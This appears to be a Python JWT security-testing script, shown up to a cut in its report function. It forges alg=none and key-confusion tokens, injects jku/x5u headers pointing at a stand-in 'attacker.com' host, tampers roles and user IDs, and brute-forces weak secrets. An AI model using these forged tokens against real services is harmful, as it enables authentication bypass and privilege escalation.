#!/usr/bin/env python3
"""
JWT Security Testing Tool
A comprehensive CLI tool for analyzing and testing JWT token security.
"""

import json
import base64
import hashlib
import hmac
import argparse
import sys
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
import jwt
from jwt.exceptions import InvalidTokenError, DecodeError
import requests
import time

# Configure debug logging
def setup_debug_logging(debug: bool = False):
    """Setup debug logging configuration."""
    if debug:
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler('jwt_debug.log')
            ]
        )
        logging.debug("Debug logging enabled")
    else:
        logging.basicConfig(level=logging.INFO)

def debug_print(message: str, debug: bool = False):
    """Print debug message if debug mode is enabled."""
    if debug:
        print(f"[DEBUG] {message}")
        logging.debug(message)

class JWTSecurityTester:
    def __init__(self, debug: bool = False):
        self.test_results = []
        self.vulnerabilities = []
        self.secrets_to_try = []
        self.debug = debug
        debug_print(f"JWTSecurityTester initialized with debug={debug}", debug)
        
    def load_common_secrets(self):
        """Load common JWT secrets for testing."""
        debug_print("Loading common JWT secrets for testing", self.debug)
        self.secrets_to_try = [
            "",  # Empty secret
            "secret",
            "SECRET",
            "Secret",
            "password",
            "123456",
            "admin",
            "root",
            "jwt",
            "token",
            "key",
            "private",
            "secretkey",
            "jwtsecret",
            "mysecret",
            "supersecret",
            "verysecret",
            "extremelysecret",
            "ultrasecret",
            "megaultrasecret"
        ]
        debug_print(f"Loaded {len(self.secrets_to_try)} common secrets", self.debug)
    
    def decode_token_without_verification(self, token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT token without signature verification."""
        debug_print(f"Decoding token without verification: {token[:20]}...", self.debug)
        try:
            # Split the token
            parts = token.split('.')
            if len(parts) != 3:
                debug_print(f"Invalid JWT format: {len(parts)} parts found", self.debug)
                raise ValueError("Invalid JWT format")
            
            header_b64, payload_b64, signature_b64 = parts
            debug_print(f"Token parts: header={len(header_b64)}, payload={len(payload_b64)}, signature={len(signature_b64)}", self.debug)
            
            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(header_b64 + '==').decode('utf-8'))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8'))
            
            debug_print(f"Decoded header: {header}", self.debug)
            debug_print(f"Decoded payload: {payload}", self.debug)
            
            return header, payload, signature_b64
            
        except Exception as e:
            debug_print(f"Error decoding token: {str(e)}", self.debug)
            raise ValueError(f"Error decoding token: {str(e)}")
    
    def analyze_token_structure(self, token: str) -> Dict[str, Any]:
        """Analyze JWT token structure and basic information."""
        debug_print("Starting token structure analysis", self.debug)
        print("🔍 Analyzing JWT token structure...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            analysis = {
                "token_length": len(token),
                "header": header,
                "payload": payload,
                "signature_length": len(signature),
                "algorithm": header.get('alg', 'unknown'),
                "token_type": header.get('typ', 'JWT'),
                "claims_count": len(payload),
                "timestamp_claims": {}
            }
            
            debug_print(f"Token analysis: length={analysis['token_length']}, algorithm={analysis['algorithm']}, claims={analysis['claims_count']}", self.debug)
            
            # Analyze timestamp claims
            timestamp_fields = ['exp', 'iat', 'nbf']
            for field in timestamp_fields:
                if field in payload:
                    timestamp = payload[field]
                    if isinstance(timestamp, (int, float)):
                        dt = datetime.fromtimestamp(timestamp)
                        analysis["timestamp_claims"][field] = {
                            "timestamp": timestamp,
                            "datetime": dt.isoformat(),
                            "is_expired": field == 'exp' and datetime.now() > dt,
                            "is_future": field == 'nbf' and datetime.now() < dt
                        }
                        debug_print(f"Timestamp claim {field}: {dt.isoformat()}", self.debug)
            
            debug_print("Token structure analysis completed", self.debug)
            return analysis
            
        except Exception as e:
            debug_print(f"Error in token structure analysis: {str(e)}", self.debug)
            return {"error": str(e)}
    
    def test_algorithm_confusion(self, token: str) -> Dict[str, Any]:
        """Test for algorithm confusion vulnerabilities."""
        print("🔄 Testing algorithm confusion attacks...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            
            results = {
                "original_algorithm": original_alg,
                "tests": []
            }
            
            # Test 1: Change algorithm to 'none'
            if original_alg != 'none':
                none_header = header.copy()
                none_header['alg'] = 'none'
                
                # Create token with 'none' algorithm
                none_token = (
                    base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.' +
                    ''  # Empty signature for 'none' algorithm
                )
                
                results["tests"].append({
                    "test": "Algorithm None Attack",
                    "vulnerable": True,
                    "description": "Token with 'none' algorithm created",
                    "token": none_token,
                    "risk_level": "Critical"
                })
            
            # Test 2: Test weak algorithms
            weak_algorithms = ['HS256', 'HS384', 'HS512']
            if original_alg in weak_algorithms:
                results["tests"].append({
                    "test": "Weak Algorithm",
                    "vulnerable": True,
                    "description": f"Using weak algorithm: {original_alg}",
                    "recommendation": "Use RS256, RS384, RS512, ES256, ES384, or ES512",
                    "risk_level": "High"
                })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_signature_verification(self, token: str, secret: str = None) -> Dict[str, Any]:
        """Test signature verification with various secrets."""
        print("🔐 Testing signature verification...")
        
        self.load_common_secrets()
        
        if secret:
            self.secrets_to_try.insert(0, secret)
        
        results = {
            "verified_secrets": [],
            "failed_attempts": len(self.secrets_to_try),
            "tests": []
        }
        
        for test_secret in self.secrets_to_try:
            try:
                # Try to decode with current secret
                decoded = jwt.decode(token, test_secret, algorithms=['HS256', 'HS384', 'HS512'])
                results["verified_secrets"].append({
                    "secret": test_secret,
                    "algorithm": "HS256/HS384/HS512"
                })
                
                results["tests"].append({
                    "test": "Weak Secret Found",
                    "vulnerable": True,
                    "description": f"Token verified with weak secret: '{test_secret}'",
                    "secret": test_secret,
                    "risk_level": "Critical"
                })
                
            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue
        
        # Test with no secret (for RS256 tokens)
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            results["tests"].append({
                "test": "No Signature Verification",
                "vulnerable": True,
                "description": "Token can be decoded without signature verification",
                "recommendation": "Always verify signatures",
                "risk_level": "High"
            })
        except Exception:
            pass
        
        return results
    
    def test_claim_validation(self, token: str) -> Dict[str, Any]:
        """Test JWT claims for security issues."""
        print("📋 Testing claim validation...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "missing_claims": [],
                "insecure_claims": [],
                "tests": []
            }
            
            # Check for required claims
            required_claims = ['exp', 'iat', 'iss', 'aud']
            for claim in required_claims:
                if claim not in payload:
                    results["missing_claims"].append(claim)
                    results["tests"].append({
                        "test": f"Missing {claim} Claim",
                        "vulnerable": True,
                        "description": f"Required claim '{claim}' is missing",
                        "recommendation": f"Always include '{claim}' claim",
                        "risk_level": "Medium"
                    })
            
            # Check expiration
            if 'exp' in payload:
                exp_timestamp = payload['exp']
                if isinstance(exp_timestamp, (int, float)):
                    exp_time = datetime.fromtimestamp(exp_timestamp)
                    if datetime.now() > exp_time:
                        results["tests"].append({
                            "test": "Expired Token",
                            "vulnerable": True,
                            "description": f"Token expired at {exp_time}",
                            "recommendation": "Use valid, non-expired tokens",
                            "risk_level": "Medium"
                        })
            
            # Check issued at time
            if 'iat' in payload:
                iat_timestamp = payload['iat']
                if isinstance(iat_timestamp, (int, float)):
                    iat_time = datetime.fromtimestamp(iat_timestamp)
                    future_time = datetime.now() + timedelta(hours=1)
                    if iat_time > future_time:
                        results["tests"].append({
                            "test": "Future IAT",
                            "vulnerable": True,
                            "description": f"IAT is in the future: {iat_time}",
                            "recommendation": "IAT should not be in the future",
                            "risk_level": "Low"
                        })
            
            # Check for sensitive data in payload
            sensitive_fields = ['password', 'secret', 'key', 'token', 'credential']
            for field in sensitive_fields:
                if field in payload:
                    results["tests"].append({
                        "test": "Sensitive Data in Payload",
                        "vulnerable": True,
                        "description": f"Sensitive field '{field}' found in payload",
                        "recommendation": "Never include sensitive data in JWT payload",
                        "risk_level": "High"
                    })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_token_tampering(self, token: str) -> Dict[str, Any]:
        """Test various token tampering techniques."""
        print("🔧 Testing token tampering...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "tampered_tokens": [],
                "tests": []
            }
            
            # Test 1: Modify user ID
            if 'user_id' in payload or 'sub' in payload or 'user' in payload:
                user_field = 'user_id' if 'user_id' in payload else ('sub' if 'sub' in payload else 'user')
                original_value = payload[user_field]
                
                # Create tampered payload
                tampered_payload = payload.copy()
                tampered_payload[user_field] = "admin" if original_value != "admin" else "superadmin"
                
                # Create tampered token
                tampered_token = (
                    base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                    signature
                )
                
                results["tampered_tokens"].append({
                    "type": "User ID Tampering",
                    "original_value": original_value,
                    "tampered_value": tampered_payload[user_field],
                    "token": tampered_token
                })
                
                results["tests"].append({
                    "test": "User ID Tampering",
                    "vulnerable": True,
                    "description": f"User ID can be modified from '{original_value}' to '{tampered_payload[user_field]}'",
                    "recommendation": "Validate user permissions server-side",
                    "risk_level": "Critical"
                })
            
            # Test 2: Modify roles/permissions
            role_fields = ['role', 'roles', 'permissions', 'scope', 'authorities']
            for role_field in role_fields:
                if role_field in payload:
                    original_roles = payload[role_field]
                    tampered_payload = payload.copy()
                    tampered_payload[role_field] = "admin" if original_roles != "admin" else "superadmin"
                    
                    tampered_token = (
                        base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                        base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                        signature
                    )
                    
                    results["tampered_tokens"].append({
                        "type": "Role Tampering",
                        "original_value": original_roles,
                        "tampered_value": tampered_payload[role_field],
                        "token": tampered_token
                    })
                    
                    results["tests"].append({
                        "test": "Role Tampering",
                        "vulnerable": True,
                        "description": f"Role can be modified from '{original_roles}' to '{tampered_payload[role_field]}'",
                        "recommendation": "Validate roles server-side",
                        "risk_level": "Critical"
                    })
                    break
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_replay_attack(self, token: str) -> Dict[str, Any]:
        """Test for replay attack vulnerabilities."""
        print("🔄 Testing replay attack scenarios...")
        
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            
            results = {
                "replay_vulnerable": False,
                "tests": []
            }
            
            # Check for jti (JWT ID) claim
            if 'jti' not in payload:
                results["replay_vulnerable"] = True
                results["tests"].append({
                    "test": "Missing JTI Claim",
                    "vulnerable": True,
                    "description": "No JWT ID (jti) claim found",
                    "recommendation": "Include unique jti claim to prevent replay attacks",
                    "risk_level": "Medium"
                })
            
            # Check for nonce claim
            if 'nonce' not in payload:
                results["tests"].append({
                    "test": "Missing Nonce",
                    "vulnerable": True,
                    "description": "No nonce claim found",
                    "recommendation": "Include nonce claim for additional replay protection",
                    "risk_level": "Low"
                })
            
            # Check expiration time
            if 'exp' not in payload:
                results["replay_vulnerable"] = True
                results["tests"].append({
                    "test": "No Expiration",
                    "vulnerable": True,
                    "description": "Token has no expiration time",
                    "recommendation": "Always set expiration time",
                    "risk_level": "High"
                })
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def test_cve_2015_2951_alg_none(self, token: str) -> dict:
        """Test for CVE-2015-2951: alg=none signature bypass vulnerability."""
        print("\U0001F6A8 Testing CVE-2015-2951 (alg=none bypass)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2015-2951",
                "description": "Algorithm None Signature Bypass Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg != 'none':
                none_header = header.copy()
                none_header['alg'] = 'none'
                none_token = (
                    base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
                )
                results["vulnerable"] = True
                results["tests"].append({
                    "test": "Algorithm None Attack",
                    "vulnerable": True,
                    "description": "Token with 'none' algorithm created - signature bypass possible",
                    "exploit_token": none_token,
                    "risk_level": "Critical",
                    "mitigation": "Reject tokens with alg='none'"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2016_10555_rs_hs256(self, token: str, public_key: str = None) -> dict:
        """Test for CVE-2016-10555: RS/HS256 public key mismatch vulnerability."""
        print("\U0001F6A8 Testing CVE-2016-10555 (RS/HS256 confusion)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2016-10555",
                "description": "RS/HS256 Public Key Mismatch Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg in ['RS256', 'RS384', 'RS512'] and public_key:
                hs_header = header.copy()
                hs_header['alg'] = 'HS256'
                try:
                    hs_token = jwt.encode(payload, public_key, algorithm='HS256', headers=hs_header)
                    results["vulnerable"] = True
                    results["tests"].append({
                        "test": "RS/HS256 Algorithm Confusion",
                        "vulnerable": True,
                        "description": "Token verified with public key as HMAC secret",
                        "exploit_token": hs_token,
                        "risk_level": "Critical",
                        "mitigation": "Use different keys for signing and verification"
                    })
                except Exception:
                    pass
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2018_0114_key_injection(self, token: str) -> dict:
        """Test for CVE-2018-0114: Key injection vulnerability."""
        print("\U0001F6A8 Testing CVE-2018-0114 (key injection)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2018-0114",
                "description": "Key Injection Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            injection_vectors = [
                {"jku": "https://attacker.com/keys.json"},
                {"x5u": "https://attacker.com/cert.pem"},
                {"kid": "injected_key_id"}
            ]
            for injection in injection_vectors:
                injected_header = header.copy()
                injected_header.update(injection)
                injected_token = (
                    base64.urlsafe_b64encode(json.dumps(injected_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.' +
                    signature
                )
                results["tests"].append({
                    "test": f"Key Injection via {list(injection.keys())[0]}",
                    "vulnerable": True,
                    "description": f"Header injection possible via {list(injection.keys())[0]}",
                    "injected_header": injection,
                    "exploit_token": injected_token,
                    "risk_level": "High",
                    "mitigation": "Validate and whitelist key sources"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2019_20933_blank_password(self, token: str) -> dict:
        """Test for CVE-2019-20933/CVE-2020-28637: Blank password vulnerability."""
        print("\U0001F6A8 Testing CVE-2019-20933 (blank password)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2019-20933/CVE-2020-28637",
                "description": "Blank Password Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            blank_secrets = ["", " ", "  ", "\t", "\n", "null", "NULL", "None", "NONE"]
            for blank_secret in blank_secrets:
                try:
                    jwt.decode(token, blank_secret, algorithms=['HS256', 'HS384', 'HS512'])
                    results["vulnerable"] = True
                    results["tests"].append({
                        "test": "Blank Password Attack",
                        "vulnerable": True,
                        "description": f"Token verified with blank secret: '{repr(blank_secret)}'",
                        "secret": blank_secret,
                        "risk_level": "Critical",
                        "mitigation": "Reject blank/empty secrets"
                    })
                    break
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2020_28042_null_signature(self, token: str) -> dict:
        """Test for CVE-2020-28042: Null signature vulnerability."""
        print("\U0001F6A8 Testing CVE-2020-28042 (null signature)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "cve": "CVE-2020-28042",
                "description": "Null Signature Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            null_signature_token = (
                base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
            )
            try:
                jwt.decode(null_signature_token, options={"verify_signature": False})
                results["vulnerable"] = True
                results["tests"].append({
                    "test": "Null Signature Attack",
                    "vulnerable": True,
                    "description": "Token with null signature accepted",
                    "exploit_token": null_signature_token,
                    "risk_level": "Critical",
                    "mitigation": "Always verify signatures"
                })
            except Exception:
                pass
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_cve_2022_21449_psychic_signature(self, token: str) -> dict:
        """Test for CVE-2022-21449: Psychic Signature ECDSA vulnerability."""
        print("\U0001F6A8 Testing CVE-2022-21449 (psychic signature)...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            original_alg = header.get('alg', 'unknown')
            results = {
                "cve": "CVE-2022-21449",
                "description": "Psychic Signature ECDSA Vulnerability",
                "vulnerable": False,
                "tests": []
            }
            if original_alg in ['ES256', 'ES384', 'ES512']:
                results["tests"].append({
                    "test": "Psychic Signature ECDSA",
                    "vulnerable": True,
                    "description": "ECDSA algorithm detected - check for psychic signature vulnerability",
                    "risk_level": "High",
                    "mitigation": "Update ECDSA implementation to reject r=0 or s=0 signatures",
                    "note": "Requires specific implementation analysis"
                })
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_claim_fuzzing(self, token: str) -> Dict[str, Any]:
        """Fuzz claim values to provoke unexpected behaviors."""
        print("🎯 Testing claim fuzzing...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "fuzzing_tests": [],
                "vulnerable_claims": []
            }
            
            # Fuzzing vectors for different claim types
            fuzz_vectors = {
                "string_claims": ["", "null", "undefined", "NaN", "Infinity", "true", "false", 
                                "admin", "root", "superuser", "administrator", "test", "debug"],
                "numeric_claims": [0, -1, 999999999999, 1.1, -1.1, float('inf'), float('-inf'), float('nan')],
                "boolean_claims": [True, False, "true", "false", 1, 0],
                "array_claims": [[], [""], [None], ["admin", "user"], [1, 2, 3]],
                "object_claims": [{}, {"admin": True}, {"role": "admin"}, None]
            }
            
            # Test each claim with fuzzing vectors
            for claim_name, claim_value in payload.items():
                if isinstance(claim_value, str):
                    for fuzz_value in fuzz_vectors["string_claims"]:
                        fuzzed_payload = payload.copy()
                        fuzzed_payload[claim_name] = fuzz_value
                        fuzzed_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(fuzzed_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        results["fuzzing_tests"].append({
                            "claim": claim_name,
                            "original_value": claim_value,
                            "fuzzed_value": fuzz_value,
                            "fuzzed_token": fuzzed_token,
                            "type": "string_fuzzing"
                        })
                elif isinstance(claim_value, (int, float)):
                    for fuzz_value in fuzz_vectors["numeric_claims"]:
                        fuzzed_payload = payload.copy()
                        fuzzed_payload[claim_name] = fuzz_value
                        fuzzed_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(fuzzed_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        results["fuzzing_tests"].append({
                            "claim": claim_name,
                            "original_value": claim_value,
                            "fuzzed_value": fuzz_value,
                            "fuzzed_token": fuzzed_token,
                            "type": "numeric_fuzzing"
                        })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_timestamp_tampering(self, token: str) -> Dict[str, Any]:
        """Test timestamp tampering attacks."""
        print("⏰ Testing timestamp tampering...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "timestamp_tests": [],
                "vulnerable_timestamps": []
            }
            
            current_time = int(time.time())
            timestamp_claims = ['exp', 'iat', 'nbf']
            
            for claim in timestamp_claims:
                if claim in payload:
                    original_timestamp = payload[claim]
                    tampered_payload = payload.copy()
                    
                    # Test various timestamp manipulations
                    timestamp_manipulations = {
                        "future_exp": current_time + 86400 * 365,  # 1 year in future
                        "past_exp": current_time - 86400 * 365,   # 1 year in past
                        "zero_timestamp": 0,
                        "negative_timestamp": -1,
                        "max_timestamp": 9999999999,
                        "string_timestamp": "invalid",
                        "null_timestamp": None
                    }
                    
                    for manipulation_name, tampered_value in timestamp_manipulations.items():
                        tampered_payload[claim] = tampered_value
                        tampered_token = (
                            base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' +
                            base64.urlsafe_b64encode(json.dumps(tampered_payload).encode()).rstrip(b'=').decode() + '.' +
                            signature
                        )
                        
                        results["timestamp_tests"].append({
                            "claim": claim,
                            "original_value": original_timestamp,
                            "manipulation": manipulation_name,
                            "tampered_value": tampered_value,
                            "tampered_token": tampered_token,
                            "risk_level": "High" if claim == 'exp' else "Medium"
                        })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_dictionary_attack(self, token: str, wordlist_file: str = None, max_attempts: int = 1000) -> Dict[str, Any]:
        """Perform high-speed dictionary attack on JWT token."""
        print("🔍 Performing dictionary attack...")
        try:
            results = {
                "attempts_made": 0,
                "secrets_tried": [],
                "cracked_secret": None,
                "attack_successful": False
            }
            
            # Load wordlist
            if wordlist_file:
                try:
                    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                        wordlist = [line.strip() for line in f if line.strip()][:max_attempts]
                except FileNotFoundError:
                    print(f"⚠️ Wordlist file not found: {wordlist_file}")
                    wordlist = self.secrets_to_try[:max_attempts]
            else:
                wordlist = self.secrets_to_try[:max_attempts]
            
            # Perform dictionary attack
            for i, secret in enumerate(wordlist):
                results["attempts_made"] += 1
                results["secrets_tried"].append(secret)
                
                try:
                    jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    results["cracked_secret"] = secret
                    results["attack_successful"] = True
                    print(f"✅ Secret found after {i+1} attempts: '{secret}'")
                    break
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                
                # Rate limiting - small delay every 100 attempts
                if (i + 1) % 100 == 0:
                    time.sleep(0.01)
            
            if not results["attack_successful"]:
                print(f"❌ Dictionary attack failed after {results['attempts_made']} attempts")
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def test_jwks_validation(self, token: str, jwks_url: str = None) -> Dict[str, Any]:
        """Test JWT validation against JWKS (JSON Web Key Set)."""
        print("🔑 Testing JWKS validation...")
        try:
            header, payload, signature = self.decode_token_without_verification(token)
            results = {
                "jwks_tests": [],
                "key_validation": {}
            }
            
            if jwks_url:
                try:
                    response = requests.get(jwks_url, timeout=10)
                    if response.status_code == 200:
                        jwks = response.json()
                        results["jwks_retrieved"] = True
                        results["jwks_keys_count"] = len(jwks.get('keys', []))
                        
                        # Test each key in the JWKS
                        for key in jwks.get('keys', []):
                            key_id = key.get('kid', 'unknown')
                            try:
                                # Try to verify token with this key
                                jwt.decode(token, key, algorithms=['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'])
                                results["key_validation"][key_id] = {
                                    "valid": True,
                                    "algorithm": key.get('alg', 'unknown')
                                }
                            except Exception:
                                results["key_validation"][key_id] = {
                                    "valid": False,
                                    "algorithm": key.get('alg', 'unknown')
                                }
                    else:
                        results["jwks_retrieved"] = False
                        results["error"] = f"Failed to retrieve JWKS: HTTP {response.status_code}"
                except Exception as e:
                    results["jwks_retrieved"] = False
                    results["error"] = str(e)
            
            # Test for missing kid in header
            if 'kid' not in header:
                results["jwks_tests"].append({
                    "test": "Missing Key ID",
                    "vulnerable": True,
                    "description": "No 'kid' claim in JWT header",
                    "risk_level": "Medium",
                    "mitigation": "Include 'kid' claim for key identification"
                })
            
            return results
        except Exception as e:
            return {"error": str(e)}

    def generate_rsa_key_pair(self, key_size: int = 2048) -> Dict[str, str]:
        """Generate RSA key pair for testing."""
        print("🔐 Generating RSA key pair...")
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=key_size
            )
            
            # Generate public key
            public_key = private_key.public_key()
            
            # Serialize keys
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            return {
                "private_key": private_pem.decode('utf-8'),
                "public_key": public_pem.decode('utf-8'),
                "key_size": key_size
            }
        except ImportError:
            return {"error": "cryptography library not available"}
        except Exception as e:
            return {"error": str(e)}

    def generate_ecdsa_key_pair(self, curve: str = "P-256") -> Dict[str, str]:
        """Generate ECDSA key pair for testing."""
        print("🔐 Generating ECDSA key pair...")
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import ec
            
            # Map curve names
            curve_map = {
                "P-256": ec.SECP256R1(),
                "P-384": ec.SECP384R1(),
                "P-521": ec.SECP521R1()
            }
            
            if curve not in curve_map:
                return {"error": f"Unsupported curve: {curve}"}
            
            # Generate private key
            private_key = ec.generate_private_key(curve_map[curve])
            
            # Generate public key
            public_key = private_key.public_key()
            
            # Serialize keys
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            return {
                "private_key": private_pem.decode('utf-8'),
                "public_key": public_pem.decode('utf-8'),
                "curve": curve
            }
        except ImportError:
            return {"error": "cryptography library not available"}
        except Exception as e:
            return {"error": str(e)}

    def forge_token(self, payload: Dict[str, Any], algorithm: str = "HS256", 
                   secret: str = None, private_key: str = None) -> Dict[str, Any]:
        """Forge a new JWT token with custom payload."""
        print("🔨 Forging JWT token...")
        try:
            header = {
                "alg": algorithm,
                "typ": "JWT"
            }
            
            if algorithm.startswith('HS'):
                if not secret:
                    secret = "default_secret"
                token = jwt.encode(payload, secret, algorithm=algorithm, headers=header)
            elif algorithm.startswith(('RS', 'ES')):
                if not private_key:
                    return {"error": "Private key required for RS/ES algorithms"}
                token = jwt.encode(payload, private_key, algorithm=algorithm, headers=header)
            else:
                return {"error": f"Unsupported algorithm: {algorithm}"}
            
            return {
                "forged_token": token,
                "algorithm": algorithm,
                "payload": payload,
                "header": header
            }
        except Exception as e:
            return {"error": str(e)}
    
    def comprehensive_test(self, token: str, secret: str = None, public_key: str = None) -> Dict[str, Any]:
        """Run comprehensive JWT security tests."""
        print("🚀 Running comprehensive JWT security tests...")
        print("=" * 60)
        
        results = {
            "test_timestamp": datetime.now().isoformat(),
            "token_preview": token[:50] + "..." if len(token) > 50 else token,
            "tests": {}
        }
        
        # Run all tests
        results["tests"]["structure_analysis"] = self.analyze_token_structure(token)
        results["tests"]["algorithm_confusion"] = self.test_algorithm_confusion(token)
        results["tests"]["signature_verification"] = self.test_signature_verification(token, secret)
        results["tests"]["claim_validation"] = self.test_claim_validation(token)
        results["tests"]["token_tampering"] = self.test_token_tampering(token)
        results["tests"]["replay_attack"] = self.test_replay_attack(token)
        
        # Run CVE-specific tests
        results["tests"]["cve_2015_2951_alg_none"] = self.test_cve_2015_2951_alg_none(token)
        results["tests"]["cve_2016_10555_rs_hs256"] = self.test_cve_2016_10555_rs_hs256(token, public_key)
        results["tests"]["cve_2018_0114_key_injection"] = self.test_cve_2018_0114_key_injection(token)
        results["tests"]["cve_2019_20933_blank_password"] = self.test_cve_2019_20933_blank_password(token)
        results["tests"]["cve_2020_28042_null_signature"] = self.test_cve_2020_28042_null_signature(token)
        results["tests"]["cve_2022_21449_psychic_signature"] = self.test_cve_2022_21449_psychic_signature(token)
        
        # Run advanced tests
        results["tests"]["claim_fuzzing"] = self.test_claim_fuzzing(token)
        results["tests"]["timestamp_tampering"] = self.test_timestamp_tampering(token)
        
        # Calculate summary
        total_vulnerabilities = 0
        critical_vulns = 0
        high_vulns = 0
        medium_vulns = 0
        low_vulns = 0
        
        for test_name, test_result in results["tests"].items():
            if "tests" in test_result:
                for test in test_result["tests"]:
                    total_vulnerabilities += 1
                    risk_level = test.get("risk_level", "Unknown")
                    if risk_level == "Critical":
                        critical_vulns += 1
                    elif risk_level == "High":
                        high_vulns += 1
                    elif risk_level == "Medium":
                        medium_vulns += 1
                    elif risk_level == "Low":
                        low_vulns += 1
        
        results["summary"] = {
            "total_vulnerabilities": total_vulnerabilities,
            "critical": critical_vulns,
            "high": high_vulns,
            "medium": medium_vulns,
            "low": low_vulns,
            "overall_risk": "Critical" if critical_vulns > 0 else ("High" if high_vulns > 0 else ("Medium" if medium_vulns > 0 else "Low"))
        }
        
        return results
    
    def generate_report(self, results: Dict[str, Any], output_file: str = None) -> str:
        """Generate a comprehensive security report."""
        print("\n📊 Generating JWT Security Report...")
        
        report = {
            "jwt_security_report": {
                "title": "JWT Security Analysis Report",
                "generated_date": datetime.now().isoformat(),
                "summary": results["summary"],
                "detailed_results": results["tests"]
            }
        }
        
        # Generate recommendations
        recommendations = []
        summary = results["summary"]
        
        if summary["critical"] > 0:
            recommendations.append("🚨 CRITICAL: Immediate action required for critical vulnerabilities")
        if summary["high"] > 0:
            recommendations.append("⚠️ HIGH: Address high-risk vulnerabilities within 30 days")
        if summary["medium"] > 0:
            recommendations.append("🔶 MEDIUM: Plan remediation for medium-risk vulnerabilities")
        
        recommendations.extend([
            "🔐 Always verify JWT signatures",
            "⏰ Set appropriate expiration times",
            "🆔 Include unique JWT ID (jti) claims",
            "👤 Validate user permissions server-side",
